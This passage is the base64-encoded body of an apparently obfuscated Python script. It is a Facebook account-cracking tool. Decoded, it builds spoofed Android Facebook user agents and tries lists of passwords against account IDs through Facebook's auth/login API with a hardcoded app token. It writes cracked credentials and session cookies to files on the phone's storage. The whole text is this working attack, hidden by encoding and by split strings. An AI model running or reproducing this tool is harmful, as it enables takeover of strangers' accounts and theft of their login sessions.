ZCB7YW5kX3ZlcnN9OyB7YW5kX21vZH0gQnVpbGQvUVAxQS57YXBwX3VsZH0gW0ZCQU4vRkI0QTtGQkFWLzYxLjAuMC4xNS42OTtGQkJWLzIwNzQ4MTE4O0ZCRE0vJysne2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE3NzZ9JysnO0ZCTEMvZW5fJysnVVM7JysnRkJDUi9WaScrJ2RlbycrJ3RyJysnb247RkJNRi9tJysnb3RvcicrJ29sYTtGQkJEL21vJysndG9yJysnb2xhO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL1gnKydUMTU2JysnMztGQlNWLzYuMDtudWxsRkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpO10nDQogICAgdWEgPSBmJ0RhbHZpay8yLjEuMCAoTGludXg7IFU7IEFuZHJvaWQge2FuZF92ZXJzfTsge2FuZF9tb2R9IEJ1aWxkL1FQMUEue2FwcF91bGR9KSBbRkJBTi9GQjRBO0ZCQVYvMzY4LjAuMC4yNC4xMDg7RkJCVi8zNzE4OTgwMTI7RkJETS8nKyd7ZGVuc2l0eT0yLjc1LHdpZHRoPTEwODAsaGVpZ2h0PTIxMzB9JysnO0ZCTEMvZW5fR0I7RkJSVi8zNzQyNTI4MDQ7RkJDUi8jUGFyTWllcnU7RkJNRi9YaWFvbWk7RkJCRC94aWFvbWk7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvUmVkbWkgTm90ZSA4VDtGQlNWLzEwO0ZCT1AvMTtGQkNBL2FybTY0LXY4YTo7XScNCiAgICB1YSA9IGYnRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCB7YW5kX3ZlcnN9OyB7YW5kX21vZH0gQnVpbGQvUVAxQS57YXBwX3VsZH0pICBbRkJBTi9GQjRBO0ZCQVYvNTkuMC4wLjE1LjMxMztGQkJWLzIwMDk3MTczO0ZCRE0vJysne2RlbnNpdHk9Mi4wLHdpZHRoPTcyMCxoZWlnaHQ9MjI4MH0nKyc7RkJMQy9lbl9HQjtGQkNSL1N1bnJpc2U7RkJNRi9zYW1zdW5nO0ZCQkQvc2Ftc3VuZztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9TTS1HNzAwRjtGQlNWLzQuMS4yO251bGxGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7XScNCiAgICB1YSA9IGYnRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCB7YW5kX3ZlcnN9OyB7YW5kX21vZH0gQnVpbGQvUVAxQS57YXBwX3VsZH0pIFtGQkFOL0ZCNEE7RkJBVi82MS4wLjAuMTUuNjk7RkJCVi8yMDc0ODA1MTtGQkRNLycrJ3tkZW5zaXR5PTEuNSx3aWR0aD01NDAsaGVpZ2h0PTg4OH0nKyc7RkJMQy9lbl9VUztGQkNSL0VUQiA0RztGQk1GL21vdG9yb2xhO0ZCQkQvbW90b3JvbGE7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvWFQxMDIyO0ZCU1YvNC40LjQ7bnVsbEZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaTtdJw0KICAgIHVhID0gZidEYWx2aWsvMi4xLjAgKExpbmV4OyBVOyBBbmRyb2lkIHthbmRfdmVyc307IHthbmRfbW9kfSBCdWlsZC9TTS1UMzExLnthcHBfdWxkfSkgW0ZCQU4vRkI0QTtGQkFWLzMxMy4wLjAuMTMzMTU7RkJCVi81Mzc5NTAxNjM7RkJETS8nKyd7ZGVuc2l0eT0yLjAsd2lkdGg9NzIwLGhlaWdodD0xMjgwfScrJztGQkxDL2VzX0NVO0ZCUlYvNTM3OTUwMTYzO0ZCQ1IvTW92aXN0YXI7RkJNRi9zYW1zdW5nO0ZCQkQvc2Ftc3VuZztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9HVC1JOTE5NUg7RkJTVi83LjA7RkJPUC8xO0ZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaTtdJw0KICAgIHVhID0gZidEYWx2aWsvMi4xLjAgKExpbnV4OyBVOyBBbmRyb2lkIHthbmRfdmVyc307IHthbmRfbW9kfSBCdWlsZC9LVFU4NFAue2FwcF91bGR9KSBbRkJBTi9GQjRBO0ZCQVYvNTQwLjAuMC44NC42MjY7RkJCVi8xNjk3MTcyNTA7RkJETS8nKyd7ZGVuc2l0eT00LjAsd2lkdGg9MTUzMixoZWlnaHQ9MjU2MH0nKyc7RkJMQy9lbl9VUztGQkNSL0dyYW1lZW5waG9uZTtGQk1GL3NhbXN1bmc7RkJCRC9zYW1zdW5nO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0dULUk5MzAwSTtGQlNWLzYuMC4wO0ZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaTtdJw0KICAgIHVhID0gZidEYWx2aWsvMi4xLjAgKExpbmV4OyBVOyBBbmRyb2lkIHthbmRfdmVyc307IHthbmRfbW9kfSBCdWlsZC9HVC1FMjI1Mi57YXBwX3VsZH0pIFtGQkFOL0ZCNEE7RkJBVi8yMDMuMC4wLjM5MzQ2O0ZCQlYvNjc4NTk1OTY2O0ZCRE0vJysne2RlbnNpdHk9Mi4wLHdpZHRoPTcyMCxoZWlnaHQ9MTI4MH0nKyc7RkJMQy9lbl9VUztGQlJWLzY3ODU5NTk2NjtGQkNSL01vdmlzdGFyO0ZCTUYvc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvR1QtSTkxMDBMS0xDSFQ7RkJTVi83LjA7RkJPUC8xO0ZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaTtdJw0KICAgIHJldHVybiB1YQ0KZGVmIHVhYSgpOg0KICAgIGFuZF92ZXJzID0gcmFuZG9tLnJhbmRpbnQoNCw1LDEyKQ0KICAgIGFuZF9tb2QgPSByYW5kb20uY2hvaWNlKGFuZHJvaWRfbW9kZWxzKQ0KICAgIGFwcF91bGQgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExLDk5OTk5OSkpKycuJytzdHIocmFuZG9tLnJhbmRpbnQoMTExLDk5OSkpDQogICAgYW5kX2lkID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMSw5OTkpKSsnLjAuMC4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDksNDkpKStzdHIocmFuZG9tLnJhbmRpbnQoMTExLDU1NSkpDQogICAgYXBwX3ZlciA9IHN0cihyYW5kb20ucmFuZGludCg5OSw5OTkpKSsnLicrc3RyKHJhbmRvbS5yYW5kaW50KDk5LDk5OSkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSg5OSw5OTkpKSsnLicrc3RyKHJhbmRvbS5yYW5kaW50KDk5LDk5OSkpKycuJytzdHIocmFuZG9tLnJhbmRpbnQoOTksOTk5KSkNCiAgICBhcHBfdmVyY29kZSA9IHN0cihyYW5kb20ucmFuZGludCgwMDAwMDAwMDAsOTk5OTk5OTk5KSkNCiAgICBwa2dfbmFtZSA9IHJhbmRvbS5jaG9pY2UoKCdjb20uZmFjZWJvb2suYWRzbWFuYWdlcicsJ2NvbS5mYWNlYm9vay5saXRlJywnY29tLmZhY2Vib29rLm9yY2EnLCdjb20uZmFjZWJvb2sua2F0YW5hJykpDQogICAgdWEgPSAiW0ZCQU4vRkI0QTtGQkFWLzIzNy4wLjAuMy4xMTY7RkJCVi85OTE3NDc4MDE7RkJETS97ZGVuc2l0eT0yLjQsd2lkdGg9MTA4MCxoZWlnaHQ9MTQwMn07RkJMQy9lbl9JTjtGQlJWLzM5MDE2NDAxMjtGQkNSL1RlbGVub3I7RkJNRi9MYXZhO0ZCQkQvTGF2YTtGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9pcmlzIFgxO0ZCU1YvMTI7RkJPUC8xO0ZCQ0EvYXJtNjQtdjhhOjtdIg0KICAgIHJldHVybiB1YQ0KZGVmIHVhYSgpOg0KICAgIGFuZF92ZXJzID0gcmFuZG9tLnJhbmRpbnQoNCwxMikNCiAgICBhbmRfbW9kID0gcmFuZG9tLmNob2ljZShhbmRyb2lkX21vZGVscykNCiAgICBhcHBfdWxkID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMSw5OTk5OTkpKSsnLicrc3RyKHJhbmRvbS5yYW5kaW50KDExMSw5OTkpKQ0KICAgIGFuZF9pZCA9IHN0cihyYW5kb20ucmFuZGludCgxMTEsOTk5KSkrJy4wLjAuJytzdHIocmFuZG9tLnJhbmRyYW5nZSg5LDQ5KSkrc3RyKHJhbmRvbS5yYW5kaW50KDExMSw1NTUpKQ0KICAgIGFwcF92ZXIgPSBzdHIocmFuZG9tLnJhbmRpbnQoOTksOTk5KSkrJy4nK3N0cihyYW5kb20ucmFuZGludCg5OSw5OTkpKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoOTksOTk5KSkrJy4nK3N0cihyYW5kb20ucmFuZGludCg5OSw5OTkpKSsnLicrc3RyKHJhbmRvbS5yYW5kaW50KDk5LDk5OSkpDQogICAgYXBwX3ZlcmNvZGUgPSBzdHIocmFuZG9tLnJhbmRpbnQoMDAwMDAwMDAwLDk5OTk5OTk5OSkpDQogICAgcGtnX25hbWUgPSByYW5kb20uY2hvaWNlKCgnY29tLmZhY2Vib29rLmFkc21hbmFnZXInLCdjb20uZmFjZWJvb2subGl0ZScsJ2NvbS5mYWNlYm9vay5vcmNhJywnY29tLmZhY2Vib29rLmthdGFuYScpKQ0KICAgIHVhID0gIltGQkFOL0ZCNEE7RkJBVi8zNTYuMC4wLjMuMTM4O0ZCQlYvNzY2NzY5NDUwO0ZCRE0ve2RlbnNpdHk9My4zLHdpZHRoPTEwODAsaGVpZ2h0PTE0NDJ9O0ZCTEMvZW5fVVM7RkJSVi8zMzUxODQ3ODM7RkJDUi9FRTtGQk1GL1NhbXN1bmc7RkJCRC9zYW1zdW5nO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0dhbGF4eSBBNztGQlNWLzk7RkJPUC8xO0ZCQ0EvYXJtNjQtdjhhOjtdIg0KICAgIHJldHVybiB1YQ0KdWdlbj1bXQ0KZGVmIHVhYSgpOg0KICAgIGFuZHJvaWRfdmVyc2lvbnMgPSBsaXN0KHJhbmdlKDQsIDEzKSkNCiAgICBzYW1zdW5nX21vZGVscyA9IFsnR2FsYXh5IFM2JywgJ0dhbGF4eSBTNycsICdHYWxheHkgUzgnLCAnR2FsYXh5IFM5JywgJ0dhbGF4eSBTMTAnLCAnR2FsYXh5IE5vdGUgNScsICdHYWxheHkgTm90ZSA4JywgJ0dhbGF4eSBOb3RlIDknLCAnR2FsYXh5IEE1JywgJ0dhbGF4eSBBNycsICdHYWxheHkgSjUnLCAnR2FsYXh5IEo3J10NCiAgICBodWF3ZWlfbW9kZWxzID0gWydQMTAnLCAnUDIwJywgJ1AzMCcsICdNYXRlIDEwJywgJ01hdGUgMjAnLCAnWTcnLCAnWTknLCAnTm92YSAzaSddDQogICAgeGlhb21pX21vZGVscyA9IFsnUmVkbWkgTm90ZSA1JywgJ1JlZG1pIE5vdGUgNicsICdSZWRtaSBOb3RlIDcnLCAnUmVkbWkgTm90ZSA4JywgJ1JlZG1pIE5vdGUgOScsICdNaSBBMScsICdNaSBBMicsICdNaSA4JywgJ01pIDknLCAnUG9jbyBGMSddDQogICAgb3Bwb19tb2RlbHMgPSBbJ0Y3JywgJ0Y5JywgJ0EzcycsICdBNXMnLCAnQTcnLCAnQTknLCAnUjExJywgJ1IxNycsICdSZW5vIDInLCAnUmVubyAzJ10NCiAgICB2aXZvX21vZGVscyA9IFsnWTU1JywgJ1k3MScsICdZODEnLCAnWTkxJywgJ1k5MycsICdZOTUnLCAnVjknLCAnVjExJywgJ1YxNScsICdTMSddDQogICAgcmVhbG1lX21vZGVscyA9IFsnQzEnLCAnQzInLCAnMyBQcm8nLCAnNSBQcm8nLCAnWCcsICdYMiddDQogICAgYW5kcm9pZF9tb2RlbHMgPSB7DQogICAgICAgICdzYW1zdW5nJzogc2Ftc3VuZ19tb2RlbHMsDQogICAgICAgICdodWF3ZWknOiBodWF3ZWlfbW9kZWxzLA0KICAgICAgICAneGlhb21pJzogeGlhb21pX21vZGVscywNCiAgICAgICAgJ29wcG8nOiBvcHBvX21vZGVscywNCiAgICAgICAgJ3Zpdm8nOiB2aXZvX21vZGVscywNCiAgICAgICAgJ3JlYWxtZSc6IHJlYWxtZV9tb2RlbHMsDQogICAgfQ0KICAgIGFuZF92ZXJzID0gcmFuZG9tLmNob2ljZShhbmRyb2lkX3ZlcnNpb25zKQ0KICAgIGJyYW5kID0gcmFuZG9tLmNob2ljZShsaXN0KGFuZHJvaWRfbW9kZWxzLmtleXMoKSkpDQogICAgYW5kX21vZCA9IHJhbmRvbS5jaG9pY2UoYW5kcm9pZF9tb2RlbHNbYnJhbmRdKQ0KICAgIGFuZF9pZCA9IGYne3JhbmRvbS5yYW5kaW50KDksOTkpfS4wLjAue3JhbmRvbS5yYW5kaW50KDksOTkpfXtyYW5kb20ucmFuZGludCg5LDk5KX0nDQogICAgYXBwX3VsZCA9IGYne3JhbmRvbS5yYW5kaW50KDExMTExMSwgOTk5OTk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSw5OTkpfScNCiAgICBhcHBfdmVyID0gZid7cmFuZG9tLnJhbmRpbnQoOTksOTk5KX0ue3JhbmRvbS5yYW5kaW50KDk5LDk5OSl9LntyYW5kb20ucmFuZGludCg5OSw5OTkpfS57cmFuZG9tLnJhbmRpbnQoOTksOTk5KX0nDQogICAgYXBwX3ZlcmNvZGUgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTAwMDAwMDAwLDk5OTk5OTk5OSkpDQogICAgcGtnX25hbWUgPSByYW5kb20uY2hvaWNlKCgnY29tLmZhY2Vib29rLmFkc21hbmFnZXInLCdjb20uZmFjZWJvb2subGl0ZScsJ2NvbS5mYWNlYm9vay5vcmNhJywnY29tLmZhY2Vib29rLmthdGFuYScpKQ0KICAgIHVhID0gZidEYWx2aWsvMi4xLjAgKExpbnV4OyBVOyBBbmRyb2lkIHthbmRfdmVyc307IHticmFuZH0ge2FuZF9tb2R9IEJ1aWxkL1NLUTEue2FwcF91bGR9KSBbRkJBTi9FTUE7RkJMQy9lbl9VUztGQkFWL3thcHBfdmVyfTtGQkJWL3thcHBfdmVyY29kZX07RkJEVi97YW5kX21vZH07RkJNRC97YnJhbmR9O0ZCU04ve2FuZF9pZH07RkJQTi97cGtnX25hbWV9XScNCiAgICByZXR1cm4gdWENCmRlZiBjb252ZXJ0KGNvb2tpZSk6DQogICAgICAgIGNva2kyID0gKCdkYXRyPSVzO3NiPSVzO2NfdXNlcj0lczt4cz0lcztmcj0lcyclKGNvb2tpZVsnZGF0ciddLGNvb2tpZVsnc2InXSxjb29raWVbJ2NfdXNlciddLGNvb2tpZVsneHMnXSxjb29raWVbJ2ZyJ10pKSAgICANCmRlZiBfX19taXh0X19fKGlkcyxwd3YsdGwpOg0KICAgIGdsb2JhbCBsb29wLG9rcyxjcHMsdHdmDQogICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyXDAzM1sxOzMybX5bXDAzM1sxOzkybUhNLVhEXDAzM1sxOzMybV0tW1wwMzNbMTszMm17bG9vcH1cMDMzWzE7OTdtL1wwMzNbMTszMm17c3RyKGxlbihpZCkpfVwwMzNbMTszMm1dLVwwMzNbMTszMm1bXDAzM1sxOzMybU9LOntsZW4ob2tzKX1cMDMzWzE7MzJtXSAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICB0cnk6DQogICAgICAgIGZvciBwYXMgaW4gcHd2Og0KICAgICAgICAgICAgZGF0YT17J2FkaWQnOiBzdHIodXVpZC51dWlkNCgpKSwNCiAgICAgICAgICAgICAgICAgICAgJ2Zvcm1hdCc6ICdqc29uJywNCiAgICAgICAgICAgICAgICAgICAgJ2RldmljZV9pZCc6IHN0cih1dWlkLnV1aWQ0KCkpLA0KICAgICAgICAgICAgICAgICAgICAnZW1haWwnOiBpZHMsDQogICAgICAgICAgICAgICAgICAgICdwYXNzd29yZCc6IHBhcywNCiAgICAgICAgICAgICAgICAgICAgJ2dlbmVyYXRlX2FuYWx5dGljc19jbGFpbXMnOiAnMScsDQogICAgICAgICAgICAgICAgICAgICdjb21tdW5pdHlfaWQnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgJ2NwbCc6ICd0cnVlJywNCiAgICAgICAgICAgICAgICAgICAgJ3RyeV9udW0nOiAnMScsDQogICAgICAgICAgICAgICAgICAgICdmYW1pbHlfZGV2aWNlX2lkJzogc3RyKHV1aWQudXVpZDQoKSksDQogICAgICAgICAgICAgICAgICAgICdjcmVkZW50aWFsc190eXBlJzogJ3Bhc3N3b3JkJywNCiAgICAgICAgICAgICAgICAgICAgJ3NvdXJjZSc6ICdsb2dpbicsDQogICAgICAgICAgICAgICAgICAgICdlcnJvcl9kZXRhaWxfdHlwZSc6ICdidXR0b25fd2l0aF9kaXNhYmxlZCcsDQogICAgICAgICAgICAgICAgICAgICdlbnJvbGxfbWlzYXV0aCc6ICdmYWxzZScsDQogICAgICAgICAgICAgICAgICAgICdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOiAnMScsDQogICAgICAgICAgICAgICAgICAgICdnZW5lcmF0ZV9tYWNoaW5lX2lkJzogJzEnLA0KICAgICAgICAgICAgICAgICAgICAnY3VycmVudGx5X2xvZ2dlZF9pbl91c2VyaWQnOiAnMCcsDQogICAgICAgICAgICAgICAgICAgICdsb2NhbGUnOiAnZW5fR0InLA0KICAgICAgICAgICAgICAgICAgICAnY2xpZW50X2NvdW50cnlfY29kZSc6ICdHQicsDQogICAgICAgICAgICAgICAgICAgICdmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUnOiAnYXV0aGVudGljYXRlJ30NCiAgICAgICAgICAgIGhlYWQ9eydVc2VyLUFnZW50JzogdWFhKCksDQogICAgICAgICAgICAgICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAgJ2d6aXAsIGRlZmxhdGUnLA0KICAgICAgICAgICAgICAgICAgICAnQWNjZXB0JzogJyovKicsDQogICAgICAgICAgICAgICAgICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLA0KICAgICAgICAgICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6ICdPQXV0aCAzNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLA0KICAgICAgICAgICAgICAgICAgICAnWC1GQi1GcmllbmRseS1OYW1lJzogJ2F1dGhlbnRpY2F0ZScsDQogICAgICAgICAgICAgICAgICAgICdYLUZCLUNvbm5lY3Rpb24tQmFuZHdpZHRoJzogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLA0KICAgICAgICAgICAgICAgICAgICAnWC1GQi1OZXQtSE5JJzogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLA0KICAgICAgICAgICAgICAgICAgICAnWC1GQi1TSU0tSE5JJzogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLA0KICAgICAgICAgICAgICAgICAgICAnWC1GQi1Db25uZWN0aW9uLVR5cGUnOiAndW5rbm93bicsDQogICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywNCiAgICAgICAgICAgICAgICAgICAgJ1gtRkItSFRUUC1FbmdpbmUnOiAnTGlnZXInfSAgDQogICAgICAgICAgICBwbyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vJysnYi1ncicrJ2FwJysnaCcrJy5mYWNlYm9vay5jb20vYXV0aC9sb2dpbicsZGF0YT1kYXRhLGhlYWRlcnM9aGVhZCxhbGxvd19yZWRpcmVjdHM9RmFsc2UpLmpzb24oKQ0KICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcG86DQogICAgICAgICAgICAgICAgY29raSA9IHBvWyJzZXNzaW9uX2Nvb2tpZXMiXQ0KICAgICAgICAgICAgICAgIGNvayA9IHt9DQogICAgICAgICAgICAgICAgZm9yIHggaW4gY29raToNCiAgICAgICAgICAgICAgICAgICAgY29rLnVwZGF0ZSh7eFsibmFtZSJdOnhbInZhbHVlIl19KQ0KICAgICAgICAgICAgICAgIGt1a2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBjb2suaXRlbXMoKSBdKQ0KICAgICAgICAgICAgICAgIGlkcyA9IHJlLmZpbmRhbGwoJ2NfdXNlcj0oLiopO3hzJywga3VraSlbMF0NCiAgICAgICAgICAgICAgICBwcmludChmJ1xyXDMzWzE7OTJtfltITS1YRC1PS10gJytpZHMrJyB+ICcrcGFzKydcMDMzWzE7OTJtJykNCiAgICAgICAgICAgICAgICAjLiBwcmludChmIlxyXDMzWzE7MzZtQ09PS0lFUz1b8J+QvF06IHtrdWtpfVwzM1sxOzM2bSIpDQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChpZHMpDQogICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9ITS1YRC1PS1MudHh0JywnYScpLndyaXRlKGlkcysnIHwgJytwYXMrJ1xuJykNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0R4SC1DT09LSUUnLCdhJykud3JpdGUoa3VraSsnXG4nKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBwb1snZXJyb3InXVsnbWVzc2FnZSddOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWRzID0gcG9bJ2Vycm9yJ11bJ2Vycm9yX2RhdGEnXVsndWlkJ10NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkcyA9IGlkcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpZHMgaW4gb2tzOnBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXHJcclwwMzNbMTszMG0gW0hNLVhELUNQXSBcMDMzWzE7MzBtJytzdHIoaWRzKSsnIHwgJytwYXMrJ1wwMzNbMTs5N20nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvSE0tWEQtcm5kLUNQLnR4dCcsJ2EnKS53cml0ZShzdHIoaWRzKSsnfCcrcGFzKydcbicpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZChzdHIoaWRzKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxzZTpjb250aW51ZQ0KICAgICAgICBsb29wKz0xDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwYXNzDQptYWluKCk="))